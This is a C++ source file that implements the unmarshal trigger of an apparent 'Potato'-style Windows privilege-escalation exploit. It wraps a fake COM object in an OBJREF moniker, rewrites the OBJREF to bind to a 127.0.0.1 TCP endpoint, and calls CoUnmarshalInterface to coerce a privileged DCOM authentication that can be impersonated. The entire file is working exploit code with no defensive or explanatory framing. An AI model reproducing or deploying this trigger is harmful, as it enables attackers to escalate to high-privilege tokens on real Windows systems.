#include "ImpersonatePPPotatoUnmarshalTrigger.h"
#include "ImpersonatePPPotatoContext.h"
#include "ObjRef.h"
#include <atlbase.h>
#include <comdef.h>
#include <wincrypt.h>
#include <objidl.h>
#include <iomanip>

#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Ole32.lib")

namespace ImpersonatePPPotato {

class FakeObject : public IUnknown {
private:
    ULONG m_refCount;

public:
    FakeObject() : m_refCount(1) {}

    HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void** ppvObject) override {
        if (riid == IID_IUnknown) {
            *ppvObject = this;
            AddRef();
            return S_OK;
        }
        *ppvObject = nullptr;
        return E_NOINTERFACE;
    }

    ULONG STDMETHODCALLTYPE AddRef() override {
        return InterlockedIncrement(&m_refCount);
    }

    ULONG STDMETHODCALLTYPE Release() override {
        ULONG count = InterlockedDecrement(&m_refCount);
        if (count == 0) {
            delete this;
        }
        return count;
    }
};

void ReplaceAll(std::wstring& str, const std::wstring& from, const std::wstring& to) {
    size_t start_pos = 0;
    while ((start_pos = str.find(from, start_pos)) != std::wstring::npos) {
        str.replace(start_pos, from.length(), to);
        start_pos += to.length();
    }
}

std::vector<uint8_t> Base64Decode(const std::wstring& base64Str) {
    DWORD cbBinary = 0;
    CryptStringToBinaryW(base64Str.c_str(), 0, CRYPT_STRING_BASE64, NULL, &cbBinary, NULL, NULL);
    std::vector<uint8_t> binaryData(cbBinary);
    CryptStringToBinaryW(base64Str.c_str(), 0, CRYPT_STRING_BASE64, binaryData.data(), &cbBinary, NULL, NULL);
    return binaryData;
}

Guid WindowsGuidToCustomGuid(const GUID& winGuid) {
    Guid customGuid;
    std::memcpy(customGuid.bytes.data(), &winGuid, 16);
    return customGuid;
}

std::wstring GuidToString(const Guid& guid) {
    WCHAR szGuid[40] = { 0 };
    StringFromGUID2(*reinterpret_cast<const GUID*>(guid.bytes.data()), szGuid, 40);
    return std::wstring(szGuid);
}

IUnknown* ImpersonatePPPotatoUnmarshalTrigger::s_pIUnknown = nullptr;
IBindCtx* ImpersonatePPPotatoUnmarshalTrigger::s_pBindCtx = nullptr;
IMoniker* ImpersonatePPPotatoUnmarshalTrigger::s_pMoniker = nullptr;
BOOL ImpersonatePPPotatoUnmarshalTrigger::s_bInitialized = FALSE;

static const IID IID_IUnknown_Real = {
    0x00000000, 0x0000, 0x0000,
    { 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }
};

static const wchar_t* s_binding = L"127.0.0.1";

ImpersonatePPPotatoUnmarshalTrigger::ImpersonatePPPotatoUnmarshalTrigger(ImpersonatePPPotatoContext* impersonatePPPotatoContext)
    : m_ImpersonatePPPotatoContext(impersonatePPPotatoContext)
{
    if (!impersonatePPPotatoContext->IsStarted()) {
        throw std::runtime_error("[-] Context was not initialized");
    }

    if (!s_bInitialized) {
        if (s_pIUnknown == nullptr) {
            s_pIUnknown = new FakeObject();
        }

        if (s_pBindCtx == nullptr) {
            HRESULT hr = CreateBindCtx(0, &s_pBindCtx);
            if (FAILED(hr)) {
                throw std::runtime_error("[-] Error in CreateBindCtx");
            }
        }

        if (s_pMoniker == nullptr) {
            HRESULT hr = CreateObjrefMoniker(s_pIUnknown, &s_pMoniker);
            if (FAILED(hr)) {
                throw std::runtime_error("[-] Error in CreateObjrefMoniker");
            }
        }

        s_bInitialized = TRUE;
    }
}

int ImpersonatePPPotatoUnmarshalTrigger::Trigger() {

    LPOLESTR ppszDisplayName = nullptr;
    HRESULT hr = s_pMoniker->GetDisplayName(s_pBindCtx, nullptr, &ppszDisplayName);
    if (FAILED(hr)) {
        std::wcerr << L"[-] Error getting GetDisplayName. HRESULT: 0x" << std::hex << hr << std::endl;
        return hr;
    }

    std::wstring displayName(ppszDisplayName);

    CoTaskMemFree(ppszDisplayName);

    ReplaceAll(displayName, L"objref:", L"");
    ReplaceAll(displayName, L":", L"");

    std::vector<uint8_t> objrefBytes = Base64Decode(displayName);

    ObjRef tmpObjRef(objrefBytes);

    std::wcout << L"\n[*] DCOM obj GUID: " << GuidToString(tmpObjRef.GuidObj) << L"\n";

    if (tmpObjRef.StandardObjRef.has_value()) {
        std::wcout << L"[*] DCOM obj IPID: " << GuidToString(tmpObjRef.StandardObjRef->IPID) << L"\n";
        std::wcout << L"[*] DCOM obj OXID: 0x" << std::hex << tmpObjRef.StandardObjRef->OXID << L"\n";
        std::wcout << L"[*] DCOM obj OID: 0x" << tmpObjRef.StandardObjRef->OID << L"\n";
        std::wcout << L"[*] DCOM obj Flags: 0x" << tmpObjRef.StandardObjRef->Flags << L"\n";
        std::wcout << L"[*] DCOM obj PublicRefs: 0x" << tmpObjRef.StandardObjRef->PublicRefs << L"\n";
    }
    else {
        std::wcout << L"[-] Is not a Standard OBJREF.\n";
        return E_FAIL;
    }

    Guid guidIUnknown = WindowsGuidToCustomGuid(IID_IUnknown);

    ObjRef::StringBinding strBinding(TowerProtocol::EPM_PROTOCOL_TCP, s_binding);
    ObjRef::SecurityBinding secBinding(0xa, 0xffff, L"");

    ObjRef::DualStringArray dualStringArray(strBinding, secBinding);

    ObjRef::Standard stdRef(
        0, 1,
        tmpObjRef.StandardObjRef->OXID,
        tmpObjRef.StandardObjRef->OID,
        tmpObjRef.StandardObjRef->IPID,
        dualStringArray
    );

    ObjRef objRef(guidIUnknown, stdRef);

    std::vector<uint8_t> data = objRef.GetBytes();

    void* ppv = nullptr;
    std::wcout << L"[*] UnMarshal Object\n";

    HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, data.size());
    if (!hGlobal) return E_OUTOFMEMORY;

    void* pMem = GlobalLock(hGlobal);
    std::memcpy(pMem, data.data(), data.size());
    GlobalUnlock(hGlobal);

    IStream* pStream = nullptr;
    hr = CreateStreamOnHGlobal(hGlobal, TRUE, &pStream);
    if (FAILED(hr)) {
        GlobalFree(hGlobal);
        return hr;
    }

    hr = CoUnmarshalInterface(pStream, IID_IUnknown, &ppv);

    pStream->Release();
    return hr;
}

}
